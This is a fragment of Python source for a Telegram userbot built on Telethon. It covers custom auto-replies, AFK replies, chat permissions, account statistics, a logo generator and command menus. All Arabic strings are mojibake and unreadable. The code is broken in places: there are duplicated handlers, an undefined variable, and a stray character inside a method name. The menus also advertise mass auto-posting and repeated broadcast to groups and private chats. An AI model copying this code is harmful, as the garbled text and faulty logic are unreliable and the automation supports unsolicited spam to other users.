            await event.edit(f"ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© ÿßŸÑÿ±ÿØ ÿßŸÑŸÖÿÆÿµÿµ ÿ®ŸÜÿ¨ÿßÿ≠. ŸÑÿØŸäŸÉ ÿßŸÑÿ¢ŸÜ {len(custom_replies)} ÿ±ÿØŸàÿØ ŸÖÿÆÿµÿµÿ©.")
        else:
            await event.edit("ŸÑŸÇÿØ ŸàÿµŸÑÿ™ ÿ•ŸÑŸâ ÿßŸÑÿ≠ÿØ ÿßŸÑÿ£ŸÇÿµŸâ ŸÑŸÑÿ±ÿØŸàÿØ ÿßŸÑŸÖÿÆÿµÿµÿ© (20).")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿ•ÿ∂ÿßŸÅÿ© ÿ±ÿØ ŸÖÿÆÿµÿµ ŸÑŸáÿß.")
    await asyncio.sleep(2)
    await event.delete()

@events.register(events.NewMessage(outgoing=True, pattern=r'^\.ÿ≠ÿ∞ŸÅ ÿ±ÿØ$'))
async def delete_custom_reply(event):
    global custom_replies
    reply_to_message = await event.get_reply_message()
    if reply_to_message:
        trigger_text = reply_to_message.raw_text
        if trigger_text in custom_replies:
            del custom_replies[trigger_text]
            with open('custom_replies.pickle', 'wb') as f:
                pickle.dump(custom_replies, f)
            await event.edit("ÿ™ŸÖ ÿ≠ÿ∞ŸÅ ÿßŸÑÿ±ÿØ ÿßŸÑŸÖÿÆÿµÿµ ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            await event.edit("ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ±ÿØ ŸÖÿÆÿµÿµ ŸÑŸáÿ∞Ÿá ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©.")
    else:
        await event.edit("Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ÿßŸÑÿ™Ÿä ÿ™ÿ±ŸäÿØ ÿ≠ÿ∞ŸÅ ÿ±ÿØŸáÿß ÿßŸÑŸÖÿÆÿµÿµ.")
    await asyncio.sleep(2)
    await event.delete()

@events.register(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled
    if (afk_mode or custom_replies_enabled) and event.is_private:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:  
                        await event.reply(reply)
                        break  
            if afk_mode:  
                if not event.raw_text in custom_replies:  
                    if reply_to_message:
                        await event.reply(reply_to_message)
                    else:
                        await event.reply(custom_reply)

@events.register(events.NewMessage(outgoing=True, pattern=r'^\.ŸÇÿ®ŸàŸÑ$'))
async def allow_chat(event):
    if event.is_private:
        allowed_chats.add(event.chat_id)
        await event.edit("ÿ™ŸÖ ÿßŸÑÿ≥ŸÖÿßÿ≠ ŸÑŸáÿ∞Ÿá ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ©.")
    else:
        await event.edit("ŸÑÿß ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ•ŸÑÿß ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ∫ÿßÿ° ÿßŸÑÿ≥ŸÖÿßÿ≠$'))
async def disallow_chat(event):
    if event.is_private:
        allowed_chats.discard(event.chat_id)
        await event.edit("ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿßŸÑÿ≥ŸÖÿßÿ≠ ŸÑŸáÿ∞Ÿá ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿ©.")
    else:
        await event.edit("ŸÑÿß ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ÿ•ŸÑÿß ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ©.")
    await asyncio.sleep(2)
    await event.delete()



last_reply_sent = None

@client.on(events.NewMessage)
async def reply_handler(event):
    global afk_mode, custom_replies, custom_replies_enabled, last_reply_sent
    if (afk_mode or custom_replies_enabled) and event.is_private and event.chat_id not in allowed_chats:
        me = await event.client.get_me()
        sender = await event.get_sender()
        if sender.id != me.id and not sender.bot:
            if custom_replies_enabled:
                for trigger, reply in custom_replies.items():
                    if trigger in event.raw_text:
                        await event.reply(reply)
                        break
            if afk_mode:
                if not event.raw_text in custom_replies:
                    if reply_to_message:
                        reply_text = reply_to_message.text
                        reply = await event.rÿ¨eply(reply_to_message)
                        if last_reply_sent and last_reply_sent.text == reply_text:
                            await last_reply_sent.delete()
                        last_reply_sent = reply
                    else:
                        reply = await event.reply(custom_reply)
                        if last_reply_sent and last_reply_sent.text == custom_reply:
                            await last_reply_sent.delete()
                        last_reply_sent = reply

STAT_INDICATION = f"**‚éâ‚ïéÿ¨ŸÄÿßÿ±Ÿê ÿ¨ŸÄŸÑÿ® ÿßŸÑÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ•ŸÜÿ™ÿ∏ŸÄÿ± ‚Öè . . .**"
CHANNELS_STR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™** ìÜ™\n\n"
CHANNELS_ADMINSTR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ ÿßÿ¥ŸÄÿ±ÿßŸÅ** ìÜ™\n\n"
CHANNELS_OWNERSTR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ ŸÖŸÑŸÉŸäŸÄÿ©** ìÜ™\n\n"
GROUPS_STR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™** ìÜ™\n\n"
GROUPS_ADMINSTR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ ÿßÿ¥ŸÄÿ±ÿßŸÅ** ìÜ™\n\n"
GROUPS_OWNERSTR = f"ìÜ© **[TNT Multi HUNTER](t.me/S21S6)** **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿ¨ŸÖŸäŸÄÿπ ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ ŸÖŸÑŸÉŸäŸÄÿ©** ìÜ™\n\n"

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ÿßÿ≠ÿµÿßÿ¶Ÿäÿßÿ™Ÿä"))
async def count(event):
    start_time = time.time()
    u = 0
    g = 0
    c = 0
    bc = 0
    b = 0
    result = ""
    await event.edit("**‚™º ÿ¨ÿßÿ±Ÿä ÿßŸÑŸÖÿπŸÄÿßŸÑÿ¨Ÿá ‡ºó.**")
    dialogs = await client.get_dialogs(limit=None, ignore_migrated=True)
    for d in dialogs:
        current_entity = d.entity
        if isinstance(current_entity, User):
            if current_entity.bot:
                b += 1
            else:
                u += 1
        elif isinstance(current_entity, Chat):
            g += 1
        elif isinstance(current_entity, Channel):
            if current_entity.broadcast:
                bc += 1
            else:
                c += 1
        else:
            print(d)
    result += f"ŸÄìÜ© ùôéùôäùôêùôçùòæùûù ùóòùó©ùóò **- üù¢ - ÿßÿ≠ÿµŸÄÿßÿ¶ŸäŸÄÿßÿ™ ÿßŸÑÿ≠ÿ≥ŸÄÿßÿ®** ìÜ™\n"
    result += f"ìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ :**\t**{u}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ :**\t**{g}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿÆÿßÿ±ŸÇŸá :**\t**{c}**\n"
    result += f"**‚éâ‚ïéÿßŸÑŸÇŸÜŸàÿßÿ™ :**\t**{bc}**\n"
    result += f"**‚éâ‚ïéÿßŸÑÿ®Ÿàÿ™ÿßÿ™ :**\t**{b}**\n"
    result += f"ŸÄìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª"
    stop_time = time.time() - start_time
    result += f"\n**- ÿßŸÑŸàŸÇŸÄÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ üìü :** {stop_time:.02f} **ÿ´ŸÄÿßŸÜŸäŸÄŸá**"
    await event.edit(result)
   

@client.on(events.NewMessage(outgoing=True, pattern=r"\.ŸÖÿπŸÑŸàŸÖÿßÿ™Ÿä"))
async def stats(event):
    "To get statistics of your telegram account."
    cat = await event.edit("**‚™º ÿ¨ÿßÿ±Ÿä ÿßŸÑŸÖÿπŸÄÿßŸÑÿ¨Ÿá ‡ºó.**...")
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0

    def inline_mention(user):
        return f"[{user.first_name}](tg://user?id={user.id})"

    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (isinstance(entity, Channel) and entity.megagroup or
              not isinstance(entity, Channel) and not isinstance(entity, User) and isinstance(entity, Chat)):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count

    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"ŸÄìÜ© ùôéùôäùôêùôçùòæùûù TNT **- üù¢ - ŸÖÿπŸÑŸàŸÖÿßÿ™ {full_name}** ìÜ™\n"
    response += f"**ŸÄìçπ‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µß‚µßìçª**\n"
    response += f"**- ÿßŸÑÿÆŸÄÿßÿµ :** {private_chats} \n"
    response += f" ‚òÖ **ÿßÿ¥ÿÆŸÄÿßÿµ :** `{private_chats - bots}` \n"
    response += f" ‚òÖ **ÿ®ŸÄŸàÿ™ŸÄÿßÿ™ :** `{bots}` \n"
    response += f"**- ÿßŸÑŸÖÿ¨ŸÖŸÄŸàÿπŸÄÿßÿ™ :** {groups} \n"
    response += f"**- ÿßŸÑŸÇŸÜŸÄŸàÿßÿ™ :** {broadcast_channels} \n"
    response += f"**- ÿßÿØŸÖŸÄŸÜ ŸÅŸä ŸÖÿ¨ŸÖŸàÿπÿßÿ™ :** {admin_in_groups} \n"
    response += f" ‚òÖ **ŸÖŸÄÿßŸÑŸÉ :** `{creator_in_groups}` \n"
    response += f" ‚òÖ **ÿßÿØŸÖŸÄŸÜ : ** `{admin_in_groups - creator_in_groups}` \n"
    response += f"**- ÿßÿØŸÖŸÄŸÜ ŸÅŸä ŸÇŸÜŸÄŸàÿßÿ™ :** {admin_in_broadcast_channels} \n"
    response += f" ‚òÖ **ŸÖŸÄÿßŸÑŸÉ :** `{creator_in_channels}` \n"
    response += (f" ‚òÖ **ÿßÿØŸÖŸÄŸÜ :** `{admin_in_broadcast_channels - creator_in_channels}` \n")
    response += f"**ŸÄUnread:** {unread} \n"
    response += f"**ŸÄUnread Mentions:** {unread_mentions} \n\n"
    response += f"üìå**- ÿßŸÑŸàŸÇŸÄÿ™ ÿßŸÑŸÖÿ≥ÿ™ÿ∫ŸÄÿ±ŸÇ üìü :** {stop_time:.02f} **ÿ´ŸÄÿßŸÜŸäŸÄŸá**"
    await cat.edit(response)

PICS_STR = []

@client.on(events.NewMessage(pattern=r"ŸÑŸàÿ¨Ÿà ?(.*)"))
async def lg1(userevent):
    event = await eor(userevent, "- ÿ¨ŸÄÿßÿ±Ÿê ÿµŸÜŸÄÿπ ŸÑŸÄŸàŸÇŸÄŸà ÿπŸÄÿ±ÿ®ŸÄŸä ÿ®ÿ≠ŸÇŸÄŸàŸÇŸÉ ...")
    text = userevent.pattern_match.group(1)
    if not text:
        await eor(userevent, "- ÿßŸÑÿßŸÖŸÄÿ± + ŸÜÿµ ÿßŸà ÿßŸÑÿßŸÖŸÄÿ± + ŸÜÿµ ÿ®ÿßŸÑŸÄÿ±ÿØ ÿπ ÿµŸÄŸàÿ±ÿ© ...")
        return
        
    arabic_text = "".join(char for char in text if char.isalpha() and char not in string.ascii_letters)
    if not arabic_text:
        await eor(userevent, "- ÿßŸÑÿ±ÿ¨ÿßÿ° ÿ•ÿØÿÆÿßŸÑ ŸÜÿµ ÿ®ÿßŸÑŸÑÿ∫ŸÄÿ© ÿßŸÑÿπÿ±ÿ®ŸäŸÄÿ© ŸÅŸÇŸÄÿ∑.\n.ŸÑŸàŸÇŸà + ŸÜÿµ ÿπŸÄÿ±ÿ®ŸÄŸä\n.ŸÑŸàŸÉŸà + ŸÜÿµ ÿßŸÜŸÉŸÄŸÑÿ¥")
        return
        
    if len(text) <= 8:
        font_size_ = 150
        strik = 10
    elif len(text) >= 9:
        font_size_ = 50
        strik = 5
    else:
        font_size_ = 130
        strik = 20
        
    if userevent.reply_to_msg_id:
        rply = await userevent.get_reply_message()
        logo_ = await userevent.client.download_media(rply)
    else:
        async for i in client.iter_messages("@Z_44_Z", filter=InputMessagesFilterPhotos):
            PICS_STR.append(i)
        pic = random.choice(PICS_STR)
        logo_ = await pic.download_media()
        
    img = Image.open(logo_)
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("font.ttf", font_size_)
    image_widthz, image_heightz = img.size
    w = font.getsize(text)[0]
    h = font.getsize(text)[1]
    image_width, image_height = img.size
    draw.text(((image_width - w) / 2, (image_height - h) / 2), text, font=font, fill=(255, 255, 255), )
    w_ = (image_width - w) / 2
    h_ = (image_height - h) / 2
    draw.text((w_, h_), text, font=font, fill="white", stroke_width=strik, stroke_fill="black")
    
    file_name = "Andencento.png"
    img.save(file_name, "PNG")
    await userevent.client.send_file(userevent.chat_id, file_name)
    await userevent.delete()
    try:
        os.remove(file_name)
        os.remove(logo_)
    except BaseException:
        pass


        
@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑÿßŸàÿßŸÖÿ±'))
async def show_commands(event):
    await event.delete()
    commands_text = """	
‚ãÜŸÄ‚îÑ‚îÄ‚îÄ‚îÑ‚îÄ[ ùóòùó©ùóî ùó¶ùó¢ùó®ùó•ùóñùóò ](t.me/S21S6)‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑŸÄ
 `.ŸÖ1`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿÆŸÄŸÄÿßÿµ
 `.ŸÖ2`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ±ÿØŸàÿØ
 `.ŸÖ3`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ŸÜŸÄŸÄÿ¥ŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ™ŸÄŸÑŸÄŸÇŸÄÿßÿ¶ŸÄŸä
 `.ŸÖ4`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ≠ŸÄŸÄÿ≥ŸÄŸÄÿßÿ®
 `.ŸÖ5`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄÿ™ŸÄŸÄÿ≥ŸÄŸÑŸÄŸäŸÄŸÄÿ©
 `.ŸÖ6`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ŸàÿπŸÄŸÄÿØ
 `.ŸÖ7`‚û™  ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸäŸÄŸÄŸàÿ™ŸÄŸÄŸäŸÄŸÄŸàÿ® 
 `.ŸÖ8`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸÖŸÄŸÄÿ¨ŸÄŸÄŸÖŸÄŸÄŸàÿπŸÄÿßÿ™
 `.ŸÖ9`‚û™ ÿßŸàÿßŸÖŸÄÿ± ÿ™ÿ¨ŸÄŸÄŸÖŸÄŸÄŸäŸÄŸÄÿπ ÿ™ŸÄŸÑŸÄŸÇŸÄÿßÿ¶ŸÄŸä 
 `.ŸÖ10`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿÆÿ∑ŸÄŸàÿ∑ ŸàÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ© 
 `.ŸÖ11`‚û™ ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÜÿµŸäÿ® ÿßŸÑÿÆÿßÿ±ÿ¨Ÿä 
 `.ŸÖ12`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÄŸÖŸÄŸÄÿ∫ŸÄÿßÿØÿ±ÿßÿ™
 `.ŸÖ13`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ∞ÿßÿ™ŸäŸÄŸÄÿ©
 `.ŸÖ14`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑÿßÿ∂ŸÄÿßŸÅŸÄÿ©
 `.ŸÖ15`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄÿ≠ŸÄŸàŸäŸÄŸÑ
 `.ŸÖ16`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßÿÆŸÄÿ±Ÿâ
 `.ŸÖ17`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ∞ŸÉŸÄŸÄÿßÿ° ÿßŸÑÿßÿµŸÄÿ∑ŸÄŸÜŸÄÿßÿπŸÄŸä
 `.ŸÖ18`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿπÿ±ÿ∂ ÿßŸÑŸÇŸÜŸàÿßÿ™ 
 `.ŸÖ19`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÑŸÄÿπŸÄÿßÿ®
 `.ŸÖ20`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßÿ∂ŸÄÿßŸÅŸÄŸäŸÄÿ©
 `.ŸÖ21`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± 2 ÿßŸÑŸÄÿ™ŸÄÿ≥ŸÄŸÑŸÄŸäŸÄŸá
 `.ŸÖ22`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄŸÖŸÄŸäŸÄŸÖŸÄÿ≤
 `.ŸÖ23`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄŸÇŸÄŸÑŸÄŸäŸÄÿØ ŸàÿßŸÑŸÄŸÜŸÄÿ™ŸÄÿ≠ŸÄÿßŸÑ
  `.ŸÖ24`‚û™ ÿßŸàÿßŸÖŸÄŸÄÿ± ÿßŸÑŸÄÿ™ŸÄÿ≠ŸÄŸÄÿ¥ŸÄŸÄŸäŸÄŸÄÿ¥
"""
    await event.reply(commands_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ1'))
async def show_m1_commands(event):
    await event.delete()
    m1_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿÆÿßÿµ [‚òÖ]‚îÅ‚îÅ‚îÅ>

 ‚Ä¢ `.ŸÉÿ™ŸÖ`

 ‚Ä¢ `.ÿ≥ŸÖÿßÿ≠`

 ‚Ä¢ `.ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸäŸÜ`

 ‚Ä¢ `.ÿßÿ∂ÿßŸÅÿ© ŸÇŸÜÿßÿ© ÿßÿ¥ÿ™ÿ±ÿßŸÉ (ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÇŸÜÿßÿ©)`

 ‚Ä¢ `ŸÖÿ≥ÿ≠ ÿßŸÑŸÇŸÜÿßÿ©`
"""
    await event.reply(m1_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ2'))
async def show_m2_commands(event):
    await event.delete()
    m2_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ±ÿØŸàÿØ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.add (ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©) ÿßŸÑÿ±ÿØ`
 ‚Ä¢ ŸÖÿ´ÿßŸÑ ŸÑÿßÿ∂ÿßŸÅŸá ÿßŸÑÿ±ÿØ ÿßŸÑÿÆÿßÿµ ŸÖÿπ ÿßŸÑÿµŸàÿ±Ÿá

 ‚Ä¢ `.ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸÑŸÖŸÅÿ™ÿßÿ≠Ÿäÿ©`

 ‚Ä¢ `.ÿßŸÑÿ±ÿØŸàÿØ`

 ‚Ä¢ `.ÿ±ÿØ (ÿßŸÑŸÜÿµ)`
 ‚Ä¢ ŸÖÿ´ÿßŸÑ ŸÑÿ™ÿπŸäŸÜ ÿßŸÑÿ±ÿØ ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä ŸÑŸÑÿÆÿßÿµ
"""
    await event.reply(m2_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ3'))
async def show_m3_commands(event):
    await event.delete()
    m3_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä  [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ŸÉ`  (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢ `.ÿ™ŸÉÿ±ÿßÿ±`  (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢  `.ŸÜÿ¥ÿ±` (ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä) (ÿπÿØÿØ ŸÖÿ±ÿßÿ™ ÿßŸÑŸÜÿ¥ÿ±) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©'

 ‚Ä¢ `.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÜÿ¥ÿ± ÿßŸÑÿ™ŸÑŸÇÿßÿ¶Ÿä` 

 ‚Ä¢ `.ŸÜÿ¥ÿ± ŸÖÿ¨ŸÖŸàÿπÿßÿ™ (ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™)` ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©

 ‚Ä¢  `.ÿÆÿßÿµ ` ÿßÿ∞ÿßÿπÿ© ŸÑŸÑÿÆÿßÿµ

 ‚Ä¢  `ÿ≥Ÿàÿ®ÿ±` ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä :
- ŸÑŸÑŸÜÿ¥ÿ± ÿ®ŸÉÿßŸÅÿ© ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ≥Ÿàÿ®ÿ± ÿßŸÑÿ™Ÿä ŸÖŸÜÿ∏ŸÖ ÿßŸÑŸäŸáÿß 

 ‚Ä¢  `ÿ™ŸÜÿßŸàÿ®` ÿπÿØÿØ ÿßŸÑÿ´ŸàÿßŸÜŸä : 
- ŸÑŸÑŸÜÿ¥ÿ± ŸÅŸä ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿ®ÿßŸÑÿ™ŸÜÿßŸàÿ® Ÿàÿ≠ÿ≥ÿ® ÿßŸÑŸàŸÇÿ™ ÿßŸÑŸÖÿ≠ÿØÿØ 

 ‚Ä¢  `.ÿ®ŸÑÿ¥` +ÿ´ŸàÿßŸÜŸä : ŸÑÿ™ŸÉÿ±ÿßÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©
ŸÖÿ´ÿßŸÑ ÿ±Ÿàÿ≠ ÿßŸÑŸÉÿ±Ÿàÿ® ÿßŸÑŸä ÿ™ÿ±ŸäÿØ ÿ™ŸÜÿ¥ÿ± ÿ®ŸäŸá ŸàÿßŸÉÿ™ÿ® ŸáÿßŸä

"""
    await event.reply(m3_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ4'))
async def show_m4_commands(event):
    await event.delete()
    m4_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ŸÅÿπŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä` / `.ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑŸàŸÇÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸÅÿπŸäŸÑ ŸàŸÇÿ™ ŸäŸÖ ÿßÿ≥ŸÖŸÉ 

 ‚Ä¢ `.ÿπÿØÿßÿØ (ÿπÿØÿØ ÿßŸÑÿØŸÇÿßÿ¶ŸÇ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸÜÿ¥ÿßÿ° ÿπÿØÿßÿØ

 ‚Ä¢ `.ÿ™ŸàŸÇŸäŸÅ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ŸàŸÇŸäŸÅ ÿßŸÑÿπÿØÿßÿØ

 ‚Ä¢ `.ÿßŸÑÿßÿ≥ŸÖ (ÿßŸÑÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸäÿØ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ∫Ÿäÿ± ÿßÿ≥ŸÖŸÉ ÿØŸàŸÜ ÿ≠ÿßÿ¨Ÿá ŸÑŸÑÿ™ÿπÿ® 

 ‚Ä¢ `.ŸÖÿ≥ÿ≠ (ÿπÿØÿØ ÿßŸÑÿ±ÿ≥ÿßÿ¶ŸÑ)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÖÿ≥ÿ≠ ÿ±ÿ≥ÿßÿ¶ŸÑŸÉ 

 ‚Ä¢ `.ÿßÿ≠ÿµÿßÿ¶Ÿäÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ÿπÿØÿØ ŸÇŸÜŸàÿßÿ™ŸÉ ŸàÿπÿØÿØ ŸÉÿ±Ÿàÿ®ÿßÿ™ŸÉ

 ‚Ä¢ `.ŸÖÿπŸÑŸàŸÖÿßÿ™Ÿä` 
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπÿ±ÿ∂ ÿ¨ŸÖŸäÿπ ŸÇŸÜŸàÿßÿ™ŸÉ ŸàŸÉÿ±Ÿàÿ®ÿßÿ™ ŸàÿπÿØÿØ ÿßŸÑÿÆÿßÿµ
"""
    await event.reply(m4_text)

